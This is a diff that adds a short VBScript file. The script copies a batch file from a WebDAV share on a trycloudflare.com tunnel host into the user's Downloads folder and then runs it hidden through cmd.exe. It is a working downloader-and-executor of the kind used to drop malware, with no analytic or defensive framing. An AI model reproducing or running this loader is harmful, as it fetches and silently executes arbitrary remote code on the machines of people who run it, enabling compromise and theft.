@@ -1,0 +1,23 @@
+Dim webDavUrl, localFilePath, batFileName, objShell
+webDavUrl = "\\oral-career-renewable-bacterial.trycloudflare.com@SSL\DavWWWRoot\google\Win\file.bat"
+batFileName = "file.bat"
+localFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads\" & batFileName
+
+' Function to copy file.bat from WebDAV to local Downloads folder
+Function CopyFile(webDavUrl, localFilePath)
+    Dim objFSO
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    objFSO.CopyFile webDavUrl, localFilePath
+    Set objFSO = Nothing
+End Function
+
+' Function to execute file.bat hidden
+Function ExecuteBatHidden(localFilePath)
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "cmd.exe /c " & localFilePath, 0, True
+    Set objShell = Nothing
+End Function
+
+' Call the functions
+CopyFile webDavUrl, localFilePath
+ExecuteBatHidden localFilePath
